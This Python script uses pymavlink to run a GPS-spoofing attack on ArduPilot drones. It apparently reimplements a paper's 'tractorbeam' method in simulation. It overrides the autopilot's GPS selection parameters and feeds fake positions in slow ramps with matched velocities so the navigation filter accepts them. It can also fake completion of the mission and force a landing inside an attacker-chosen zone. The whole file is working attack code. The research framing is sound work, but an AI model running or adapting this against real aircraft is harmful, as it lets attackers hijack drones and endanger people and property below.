#!/usr/bin/env python3
import argparse
import csv
import math
import os
import statistics
import time
from collections import deque

from pymavlink import mavutil


DEFAULT_MASTER = "udp:127.0.0.1:14550"
EARTH_RADIUS_M = 6378137.0
WGS84_A = 6378137.0
WGS84_E2 = 6.69437999014e-3


def haversine_m(lat1, lon1, lat2, lon2):
    lat1_rad = math.radians(lat1)
    lon1_rad = math.radians(lon1)
    lat2_rad = math.radians(lat2)
    lon2_rad = math.radians(lon2)
    dlat = lat2_rad - lat1_rad
    dlon = lon2_rad - lon1_rad
    a = math.sin(dlat / 2) ** 2 + math.cos(lat1_rad) * math.cos(lat2_rad) * math.sin(dlon / 2) ** 2
    return 2 * EARTH_RADIUS_M * math.asin(math.sqrt(a))


def offset_lat_lon(lat, lon, north_m, east_m):
    dlat = north_m / EARTH_RADIUS_M
    dlon = east_m / (EARTH_RADIUS_M * math.cos(math.radians(lat)))
    return lat + math.degrees(dlat), lon + math.degrees(dlon)


def latlon_to_ecef(lat, lon, alt_m=0.0):
    lat_rad = math.radians(lat)
    lon_rad = math.radians(lon)
    sin_lat = math.sin(lat_rad)
    cos_lat = math.cos(lat_rad)
    sin_lon = math.sin(lon_rad)
    cos_lon = math.cos(lon_rad)
    n = WGS84_A / math.sqrt(1.0 - WGS84_E2 * sin_lat * sin_lat)
    x = (n + alt_m) * cos_lat * cos_lon
    y = (n + alt_m) * cos_lat * sin_lon
    z = ((1.0 - WGS84_E2) * n + alt_m) * sin_lat
    return (x, y, z)


def ecef_to_latlon(x, y, z):
    b = WGS84_A * math.sqrt(1.0 - WGS84_E2)
    ep = math.sqrt((WGS84_A ** 2 - b ** 2) / (b ** 2))
    p = math.sqrt(x * x + y * y)
    theta = math.atan2(z * WGS84_A, p * b)
    sin_theta = math.sin(theta)
    cos_theta = math.cos(theta)
    lat = math.atan2(
        z + ep * ep * b * sin_theta ** 3,
        p - WGS84_E2 * WGS84_A * cos_theta ** 3,
    )
    lon = math.atan2(y, x)
    return math.degrees(lat), math.degrees(lon)


def ecef_distance(a, b):
    return math.sqrt((a[0] - b[0]) ** 2 + (a[1] - b[1]) ** 2 + (a[2] - b[2]) ** 2)


def ecef_lerp(a, b, t):
    return (
        a[0] + (b[0] - a[0]) * t,
        a[1] + (b[1] - a[1]) * t,
        a[2] + (b[2] - a[2]) * t,
    )


def step_toward(current, target, max_step_m):
    dx = target[0] - current[0]
    dy = target[1] - current[1]
    dz = target[2] - current[2]
    dist = math.sqrt(dx * dx + dy * dy + dz * dz)
    if dist <= max_step_m or dist == 0:
        return target
    scale = max_step_m / dist
    return (current[0] + dx * scale, current[1] + dy * scale, current[2] + dz * scale)


def latlon_to_local(lat, lon, ref_lat, ref_lon):
    dlat = math.radians(lat - ref_lat)
    dlon = math.radians(lon - ref_lon)
    north = dlat * EARTH_RADIUS_M
    east = dlon * EARTH_RADIUS_M * math.cos(math.radians(ref_lat))
    return north, east


def distance_to_track_m(lat, lon, start_lat, start_lon, end_lat, end_lon):
    px, py = latlon_to_local(lat, lon, start_lat, start_lon)
    ax, ay = 0.0, 0.0
    bx, by = latlon_to_local(end_lat, end_lon, start_lat, start_lon)
    abx = bx - ax
    aby = by - ay
    ab_len_sq = abx * abx + aby * aby
    if ab_len_sq == 0:
        return math.sqrt(px * px + py * py)
    t = ((px - ax) * abx + (py - ay) * aby) / ab_len_sq
    t = max(0.0, min(1.0, t))
    proj_x = ax + t * abx
    proj_y = ay + t * aby
    dx = px - proj_x
    dy = py - proj_y
    return math.sqrt(dx * dx + dy * dy)


def parse_circle(text):
    parts = [p.strip() for p in text.split(",")]
    if len(parts) != 3:
        raise ValueError("Zone circle must be 'lat,lon,radius_m'")
    return float(parts[0]), float(parts[1]), float(parts[2])


def parse_latlon(text):
    parts = [p.strip() for p in text.split(",")]
    if len(parts) != 2:
        raise ValueError("Target must be 'lat,lon'")
    return float(parts[0]), float(parts[1])


def bearing_to_offset(bearing_deg, distance_m):
    bearing_rad = math.radians(bearing_deg)
    north = math.cos(bearing_rad) * distance_m
    east = math.sin(bearing_rad) * distance_m
    return north, east


def parse_qgc_wpl(path):
    items = []
    with open(path, "r", encoding="utf-8") as handle:
        header = handle.readline().strip()
        if not header.startswith("QGC WPL"):
            raise ValueError("Unsupported mission format: expected QGC WPL")
        for raw_line in handle:
            line = raw_line.split("#", 1)[0].strip()
            if not line:
                continue
            parts = line.split()
            if len(parts) < 12:
                continue
            items.append(
                {
                    "seq": int(parts[0]),
                    "command": int(parts[3]),
                    "x": float(parts[8]),
                    "y": float(parts[9]),
                    "z": float(parts[10]),
                }
            )
    return items


def find_track_segment(items, current_seq):
    if current_seq is None:
        waypoint_items = [item for item in items if item["command"] == mavutil.mavlink.MAV_CMD_NAV_WAYPOINT]
        if len(waypoint_items) >= 2:
            return waypoint_items[0], waypoint_items[1]
        return None
    current_idx = None
    for idx, item in enumerate(items):
        if item["seq"] == current_seq:
            current_idx = idx
            break
    if current_idx is None:
        return None

    # MISSION_CURRENT.seq is the index of the waypoint the drone is
    # currently navigating *to*, so the track endpoint is the NAV_WAYPOINT
    # at or after current_seq, and the start is the previous NAV_WAYPOINT.
    # Earlier code had end_idx searching strictly *after* a start at-or-
    # before current_seq, which returned None on the final segment and
    # silently disabled the leash/jump mechanism.
    end_idx = None
    for idx in range(current_idx, len(items)):
        if items[idx]["command"] == mavutil.mavlink.MAV_CMD_NAV_WAYPOINT:
            end_idx = idx
            break
    if end_idx is None:
        return None

    start_idx = None
    for idx in range(end_idx - 1, -1, -1):
        if items[idx]["command"] == mavutil.mavlink.MAV_CMD_NAV_WAYPOINT:
            start_idx = idx
            break
    if start_idx is None:
        return None

    return items[start_idx], items[end_idx]


def set_param(mav, name, value, timeout_s=3.0):
    # Wait for the autopilot's PARAM_VALUE echo so we know the value was
    # actually accepted. Fire-and-forget here was masking failures of
    # GPS_AUTO_SWITCH / GPS_PRIMARY at sync-start (silent attack).
    mav.mav.param_set_send(
        mav.target_system,
        mav.target_component,
        name.encode("utf-8"),
        float(value),
        mavutil.mavlink.MAV_PARAM_TYPE_REAL32,
    )
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        msg = mav.recv_match(type="PARAM_VALUE", blocking=True, timeout=0.5)
        if msg is None:
            continue
        pid = msg.param_id
        if isinstance(pid, bytes):
            pid = pid.decode("utf-8")
        if pid.strip("\x00") == name:
            return True
    return False


def send_gps_input(mav, now, fix_type, lat, lon, alt, vn, ve, vd, sats):
    # gps_id=1 routes to AP_GPS instance 1, i.e. the GPS2 backend that we
    # configured to GPS2_TYPE=14 (MAVLink). AP_GPS_MAV silently drops
    # messages whose gps_id doesn't match its instance number.
    mav.mav.gps_input_send(
        int(now * 1e6),
        1,     # gps_id — must match GPS2 instance (1, since GPS1 is index 0)
        0,
        0,
        0,
        max(3, fix_type),
        int(lat * 1e7),
        int(lon * 1e7),
        alt,
        2.0,   # hdop
        2.0,   # vdop
        vn,
        ve,
        vd,
        1.0,   # speed_accuracy
        5.0,   # horiz_accuracy
        5.0,   # vert_accuracy
        sats,
    )


def set_mode(mav, mode):
    mapping = mav.mode_mapping()
    if mode not in mapping:
        raise ValueError(f"Mode {mode} not supported")
    mav.mav.set_mode_send(
        mav.target_system,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mapping[mode],
    )


def run():
    parser = argparse.ArgumentParser(description="Inject spoofed GPS_INPUT data.")
    parser.add_argument("--master", default=DEFAULT_MASTER)
    parser.add_argument(
        "--profile",
        choices=["tractorbeam", "ramp"],
        default="tractorbeam",
        help="Spoofing profile to use",
    )
    parser.add_argument("--zone-circle", required=True, help="lat,lon,radius_m")
    parser.add_argument("--mission", default="")
    parser.add_argument("--target-latlon", default="")
    parser.add_argument(
        "--land-target-latlon",
        default="",
        help="lat,lon to force a landing inside the attacker zone",
    )
    parser.add_argument(
        "--land-radius-m",
        type=float,
        default=5.0,
        help="Trigger landing once true position is within this radius",
    )
    parser.add_argument(
        "--fake-final-s",
        type=float,
        default=2.0,
        help="Seconds to spoof the final waypoint before LAND",
    )
    parser.add_argument("--leash-length-m", type=float, default=13.0)
    parser.add_argument(
        "--gps-update-hz",
        type=float,
        default=0.0,
        help="Override observed GPS rate (0 = use measured f_obs)",
    )
    parser.add_argument("--max-velocity-mps", type=float, default=500.0)
    parser.add_argument("--ainit-offset-m", type=float, default=20.0)
    parser.add_argument("--jump-cooldown-s", type=float, default=1.0)
    parser.add_argument("--max-offset-m", type=float, default=50.0)
    parser.add_argument(
        "--final-wp-min-dist-m",
        type=float,
        default=0.0,
        help="Keep spoofed position at least this far from the final waypoint (0 disables)",
    )
    parser.add_argument("--ramp-time-s", type=float, default=20.0)
    parser.add_argument("--exit-decay-s", type=float, default=5.0)
    parser.add_argument("--offset-bearing-deg", type=float, default=90.0)
    parser.add_argument(
        "--sync-duration-s",
        type=float,
        default=1.5,
        help="Soft-takeover window: shadow real GPS this long before deviating",
    )
    parser.add_argument(
        "--ramp-ticks",
        type=int,
        default=30,
        help="Ticks to interp from p_real to a_init. With real-velocity "
             "reporting and modern ArduCopter's tight innovation gates, a "
             "slow ramp keeps each tick's position innovation small enough "
             "to pass the gate, letting the EKF state migrate toward the "
             "fake position rather than rejecting the spoofed GPS.",
    )
    parser.add_argument("--log", default="")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    def log(message):
        if args.verbose:
            print(message, flush=True)

    zone_lat, zone_lon, zone_radius = parse_circle(args.zone_circle)
    if args.target_latlon:
        target_lat, target_lon = parse_latlon(args.target_latlon)
    else:
        target_lat, target_lon = zone_lat, zone_lon

    land_lat = land_lon = None
    if args.land_target_latlon:
        land_lat, land_lon = parse_latlon(args.land_target_latlon)

    log_path = args.log
    if not log_path:
        ts = time.strftime("%Y%m%d_%H%M%S")
        log_path = os.path.join("logs", f"spoofing_{ts}.csv")

    os.makedirs(os.path.dirname(log_path) or ".", exist_ok=True)

    mav = mavutil.mavlink_connection(args.master)
    log("Waiting for heartbeat...")
    mav.wait_heartbeat()

    mission_items = []
    if args.mission:
        mission_items = parse_qgc_wpl(args.mission)

    final_wp = None
    for item in mission_items:
        if item["command"] == mavutil.mavlink.MAV_CMD_NAV_WAYPOINT:
            final_wp = item

    # Shared state across both profiles.
    last_gps = None
    last_global = None
    last_sim = None
    current_seq = None

    # Tractorbeam state machine: observe -> sync -> ramp -> adaptive
    state = "observe"
    state_started_at = None
    sync_started_at = None
    ramp_ticks_done = 0
    ramp_start_ecef = None

    last_true_ecef = None
    ainit_ecef = None
    a_ecef = None
    last_jump_time = 0.0
    last_gps_arrival = None
    gps_intervals = deque(maxlen=20)
    f_obs = 0.0

    # Ramp profile (legacy) state.
    ramp_spoofing = False
    ramp_spoof_start = None
    ramp_exit_start = None

    gps_forced = False

    land_committed = False
    land_done = False
    land_started_at = None

    last_send_time = 0.0

    with open(log_path, "w", newline="", encoding="utf-8") as handle:
        writer = csv.writer(handle)
        writer.writerow(
            [
                "timestamp",
                "profile",
                "state",
                "source",
                "in_zone",
                "f_obs_hz",
                "offset_m",
                "distance_to_track_m",
                "lat",
                "lon",
            ]
        )
        handle.flush()

        log("Listening for GPS and injecting GPS_INPUT...")
        while True:
            msg = mav.recv_match(
                type=["GPS_RAW_INT", "GLOBAL_POSITION_INT", "SIMSTATE", "MISSION_CURRENT"],
                blocking=True,
                timeout=0.5,
            )
            now = time.time()

            if msg is not None:
                if msg.get_type() == "GPS_RAW_INT":
                    last_gps = msg
                    if last_gps_arrival is not None:
                        gps_intervals.append(now - last_gps_arrival)
                    last_gps_arrival = now
                    if len(gps_intervals) >= 3:
                        median_interval = statistics.median(gps_intervals)
                        if median_interval > 0:
                            f_obs = 1.0 / median_interval
                elif msg.get_type() == "GLOBAL_POSITION_INT":
                    last_global = msg
                elif msg.get_type() == "SIMSTATE":
                    last_sim = msg
                elif msg.get_type() == "MISSION_CURRENT":
                    current_seq = msg.seq

            # Attacker observes the drone's *true* position. In the paper's
            # threat model (§4) this comes from a radar/optical tracker; in
            # SITL the ground-truth is SIMSTATE.lat/lng. Reading the EKF-
            # filtered GLOBAL_POSITION_INT here would be circular once we
            # start spoofing (the EKF state is what we're corrupting). We
            # still need altitude from GLOBAL_POSITION_INT since SIMSTATE
            # in this build carries no altitude field.
            # Tractorbeam needs ground truth (SIMSTATE) to compute a_init and
            # advance a_t per the paper. Falling back to GLOBAL_POSITION_INT
            # once spoofing has started would feed the EKF-corrupted state
            # back into the algorithm, so we hard-require SIMSTATE for the
            # tractorbeam profile and only allow the GLOBAL_POSITION_INT /
            # GPS_RAW_INT fallbacks for the legacy 'ramp' profile.
            source = "gps"
            if last_sim is not None:
                lat = last_sim.lat / 1e7
                lon = last_sim.lng / 1e7
                source = "sim"
                if last_global is not None:
                    alt = last_global.alt / 1000.0
                elif last_gps is not None:
                    alt = last_gps.alt / 1000.0
                else:
                    alt = 0.0
            elif args.profile == "tractorbeam":
                # No SIMSTATE yet (or lost) → wait rather than corrupt a_init.
                continue
            elif last_global is not None:
                lat = last_global.lat / 1e7
                lon = last_global.lon / 1e7
                alt = last_global.alt / 1000.0
                source = "global"
            elif last_gps is not None:
                lat = last_gps.lat / 1e7
                lon = last_gps.lon / 1e7
                alt = last_gps.alt / 1000.0
            else:
                continue

            dist_m = haversine_m(lat, lon, zone_lat, zone_lon)
            in_zone = dist_m <= zone_radius

            land_target_active = (
                land_lat is not None
                and final_wp is not None
                and current_seq == final_wp["seq"]
            )

            # Pace the loop: pick injection rate from f_obs (or override).
            update_hz = args.gps_update_hz if args.gps_update_hz > 0 else (f_obs if f_obs > 0 else 5.0)
            period_s = 1.0 / update_hz

            if not in_zone:
                if args.profile == "tractorbeam":
                    # Paper §7.3.3: once the attacker has committed (a_init
                    # picked, soft-takeover done), spoofing runs continuously
                    # until the operator stops — there is no zone concept in
                    # the paper, the zone here is only a *trigger* for entry
                    # into sync. Resetting on zone-exit would let the EKF
                    # snap back to true GPS and undo the deflection, causing
                    # the drone to re-enter the zone and oscillate.
                    if state == "observe":
                        continue
                    # else: fall through and keep emitting spoofed GPS_INPUT
                else:
                    if ramp_spoofing:
                        log("Exited zone - stopping ramp spoofing")
                    ramp_spoofing = False
                    ramp_spoof_start = None
                    ramp_exit_start = None
                    continue

            # ---- Profile-specific state transitions ----
            if args.profile == "tractorbeam":
                if state == "observe" and in_zone:
                    state = "sync"
                    state_started_at = now
                    sync_started_at = now
                    log(f"Entered zone. f_obs={f_obs:.2f}Hz. Starting sync handoff.")
                    # Pin EKF to GPS2 (spoofer) NOW, while spoofed positions
                    # still match the real ones — the migration is silent and
                    # avoids variance spikes mid-deviation. Defer killing GPS1
                    # until end of sync. If either set fails the EKF won't
                    # consume our spoofed feed and the attack collapses, so
                    # raise loudly instead of silently continuing.
                    if not set_param(mav, "GPS_AUTO_SWITCH", 0):
                        raise RuntimeError("Failed to set GPS_AUTO_SWITCH=0")
                    if not set_param(mav, "GPS_PRIMARY", 1):
                        raise RuntimeError("Failed to set GPS_PRIMARY=1")
                    gps_forced = True
                elif state == "sync" and (now - sync_started_at) >= args.sync_duration_s:
                    # Don't silence GPS1 here: with GPS_PRIMARY=1 +
                    # GPS_AUTO_SWITCH=0 already set at sync-start, the EKF is
                    # ignoring GPS1. Disabling it mid-flight produces a
                    # transient that can spike velVar.
                    state = "ramp"
                    state_started_at = now
                    ramp_ticks_done = 0
                    ramp_start_ecef = latlon_to_ecef(lat, lon, alt)
                    last_true_ecef = ramp_start_ecef
            else:  # legacy ramp profile
                if in_zone and not ramp_spoofing:
                    ramp_spoofing = True
                    ramp_spoof_start = now
                    ramp_exit_start = None
                    log("Entered zone - starting ramp spoofing")
                elif not in_zone and ramp_spoofing and ramp_exit_start is None:
                    ramp_exit_start = now
                    log("Exited zone - ramping down spoofing")

            # ---- Decide whether to emit a GPS_INPUT this tick ----
            time_since_last_send = now - last_send_time
            if time_since_last_send < period_s * 0.95:
                continue

            if args.profile == "tractorbeam" and state == "observe":
                # Pure listening — collect rate, do not emit.
                continue

            spoof_lat = None
            spoof_lon = None
            offset_m = 0.0
            distance_to_track = None

            if args.profile == "ramp":
                if not ramp_spoofing:
                    continue
                if in_zone:
                    if args.ramp_time_s > 0:
                        elapsed = now - ramp_spoof_start
                        offset_m = min(args.max_offset_m, args.max_offset_m * (elapsed / args.ramp_time_s))
                    else:
                        offset_m = args.max_offset_m
                else:
                    if args.exit_decay_s > 0:
                        elapsed = now - (ramp_exit_start or now)
                        offset_m = max(0.0, args.max_offset_m * (1.0 - (elapsed / args.exit_decay_s)))
                    else:
                        offset_m = 0.0
                    if offset_m <= 0.0:
                        ramp_spoofing = False
                        log("Ramp spoofing stopped")
                        continue
                north_m, east_m = bearing_to_offset(args.offset_bearing_deg, offset_m)
                spoof_lat, spoof_lon = offset_lat_lon(lat, lon, north_m, east_m)

            elif args.profile == "tractorbeam":
                true_ecef = latlon_to_ecef(lat, lon, alt)

                if state == "sync":
                    # Shadow the real position exactly (offset = 0).
                    spoof_lat, spoof_lon = lat, lon
                    offset_m = 0.0

                else:
                    # ramp / adaptive — compute a_init the first time we need it.
                    if ainit_ecef is None:
                        target_ecef = latlon_to_ecef(target_lat, target_lon, 0.0)
                        dist_to_target = ecef_distance(true_ecef, target_ecef)
                        offset_init = max(args.ainit_offset_m, args.leash_length_m + 1.0)
                        if dist_to_target > 0:
                            k = -(offset_init / dist_to_target)
                        else:
                            k = -1.0
                        ainit_ecef = (
                            true_ecef[0] + k * (target_ecef[0] - true_ecef[0]),
                            true_ecef[1] + k * (target_ecef[1] - true_ecef[1]),
                            true_ecef[2] + k * (target_ecef[2] - true_ecef[2]),
                        )
                        log(f"Computed a_init at {ecef_distance(ainit_ecef, true_ecef):.1f}m from p_init")

                    max_hop_m = period_s * args.max_velocity_mps

                    if state == "ramp":
                        ramp_ticks_done += 1
                        t = min(1.0, ramp_ticks_done / max(1, args.ramp_ticks))
                        a_ecef = ecef_lerp(ramp_start_ecef, ainit_ecef, t)
                        if ramp_ticks_done >= args.ramp_ticks:
                            state = "adaptive"
                            state_started_at = now
                            last_true_ecef = true_ecef
                            log("Ramp complete - entering adaptive spoofing")

                    else:  # adaptive
                        if last_true_ecef is not None:
                            delta_true = (
                                true_ecef[0] - last_true_ecef[0],
                                true_ecef[1] - last_true_ecef[1],
                                true_ecef[2] - last_true_ecef[2],
                            )
                        else:
                            delta_true = (0.0, 0.0, 0.0)

                        track = find_track_segment(mission_items, current_seq) if mission_items else None
                        if track and a_ecef is not None:
                            a_lat, a_lon = ecef_to_latlon(*a_ecef)
                            distance_to_track = distance_to_track_m(
                                a_lat,
                                a_lon,
                                track[0]["x"],
                                track[0]["y"],
                                track[1]["x"],
                                track[1]["y"],
                            )

                        jump_needed = (
                            distance_to_track is not None
                            and distance_to_track <= args.leash_length_m
                        )

                        if jump_needed and (now - last_jump_time) >= args.jump_cooldown_s:
                            a_ecef = step_toward(a_ecef, ainit_ecef, max_hop_m)
                            last_jump_time = now
                        else:
                            step_mag = math.sqrt(
                                delta_true[0] ** 2 + delta_true[1] ** 2 + delta_true[2] ** 2
                            )
                            if step_mag > max_hop_m and step_mag > 0:
                                scale = max_hop_m / step_mag
                                delta_true = (
                                    delta_true[0] * scale,
                                    delta_true[1] * scale,
                                    delta_true[2] * scale,
                                )
                            a_ecef = (
                                a_ecef[0] + delta_true[0],
                                a_ecef[1] + delta_true[1],
                                a_ecef[2] + delta_true[2],
                            )
                        last_true_ecef = true_ecef

                    offset_m = ecef_distance(a_ecef, true_ecef)
                    spoof_lat, spoof_lon = ecef_to_latlon(*a_ecef)

            if spoof_lat is None:
                continue

            if args.final_wp_min_dist_m > 0 and final_wp is not None:
                final_lat = final_wp["x"]
                final_lon = final_wp["y"]
                if current_seq == final_wp["seq"]:
                    if args.target_latlon:
                        dir_n, dir_e = latlon_to_local(target_lat, target_lon, zone_lat, zone_lon)
                    else:
                        dir_n, dir_e = bearing_to_offset(args.offset_bearing_deg, 1.0)
                    if dir_n == 0.0 and dir_e == 0.0:
                        dir_n, dir_e = bearing_to_offset(args.offset_bearing_deg, 1.0)
                    scale = (zone_radius + args.final_wp_min_dist_m) / math.sqrt(dir_n * dir_n + dir_e * dir_e)
                    spoof_lat, spoof_lon = offset_lat_lon(zone_lat, zone_lon, dir_n * scale, dir_e * scale)
                    offset_m = haversine_m(spoof_lat, spoof_lon, lat, lon)
                dist_to_final = haversine_m(spoof_lat, spoof_lon, final_lat, final_lon)
                if dist_to_final < args.final_wp_min_dist_m:
                    north, east = latlon_to_local(spoof_lat, spoof_lon, final_lat, final_lon)
                    if north == 0.0 and east == 0.0:
                        if args.target_latlon:
                            north, east = latlon_to_local(target_lat, target_lon, final_lat, final_lon)
                        else:
                            north, east = bearing_to_offset(args.offset_bearing_deg, 1.0)
                    step = max(1e-6, math.sqrt(north * north + east * east))
                    scale = args.final_wp_min_dist_m / step
                    spoof_lat, spoof_lon = offset_lat_lon(final_lat, final_lon, north * scale, east * scale)
                    offset_m = haversine_m(spoof_lat, spoof_lon, lat, lon)

            # Per paper §7.3.2 (ii): "GPS velocity must be changed adaptively
            # to be similar to the motion of the drone body" — i.e. equal to
            # the IMU-derived velocity. With GPS velocity matching the drone's
            # real velocity, the EKF's velVar stays ~0 even though the
            # *position* is fake. fail_count accumulates only on the single
            # jump tick (a_init), then drops back during adaptive matching.
            vn = ve = vd = 0.0
            if last_global is not None:
                vn = last_global.vx / 100.0
                ve = last_global.vy / 100.0
                vd = last_global.vz / 100.0

            # Landing-target handling: when true vehicle is within the
            # specified land-radius of the desired land target, briefly
            # spoof the final waypoint so the autopilot believes it reached
            # the mission final and then command LAND while leaving the
            # vehicle's true position inside the attacker zone.
            if land_lat is not None and not land_done:
                dist_to_land = haversine_m(lat, lon, land_lat, land_lon)
                if dist_to_land <= args.land_radius_m and not land_committed:
                    log(f"Land target in range ({dist_to_land:.1f}m) - committing fake final for {args.fake_final_s}s")
                    land_committed = True
                    land_started_at = now

                if land_committed and (now - land_started_at) <= args.fake_final_s:
                    # During fake-final window, set spoofed position to
                    # the real mission final (so mission appears reached).
                    if final_wp is not None:
                        spoof_lat = final_wp["x"]
                        spoof_lon = final_wp["y"]
                    else:
                        spoof_lat, spoof_lon = zone_lat, zone_lon
                    offset_m = haversine_m(spoof_lat, spoof_lon, lat, lon)

                elif land_committed and (now - land_started_at) > args.fake_final_s:
                    log("Fake-final window ended - commanding LAND and restoring GPS")
                    try:
                        set_mode(mav, "LAND")
                    except Exception as exc:
                        log(f"set_mode(LAND) failed: {exc}")
                    # Restore GPS routing so no further spoofing occurs
                    if not set_param(mav, "GPS_PRIMARY", 0):
                        raise RuntimeError("Failed to set GPS_PRIMARY=0")
                    if not set_param(mav, "GPS_AUTO_SWITCH", 1):
                        raise RuntimeError("Failed to set GPS_AUTO_SWITCH=1")
                    gps_forced = False
                    land_done = True
                    # After commanding LAND, stop emitting spoofed GPS.
                    continue

            send_gps_input(
                mav,
                now,
                last_gps.fix_type if last_gps is not None else 3,
                spoof_lat,
                spoof_lon,
                alt,
                vn,
                ve,
                vd,
                last_gps.satellites_visible if last_gps is not None else 10,
            )
            last_send_time = now

            log_state = state if args.profile == "tractorbeam" else (
                "ramp_active" if ramp_spoofing else "ramp_idle"
            )
            writer.writerow(
                [
                    now,
                    args.profile,
                    log_state,
                    source,
                    int(in_zone),
                    f"{f_obs:.3f}",
                    f"{offset_m:.3f}",
                    f"{distance_to_track:.3f}" if distance_to_track is not None else "",
                    spoof_lat,
                    spoof_lon,
                ]
            )
            handle.flush()


if __name__ == "__main__":
    run()
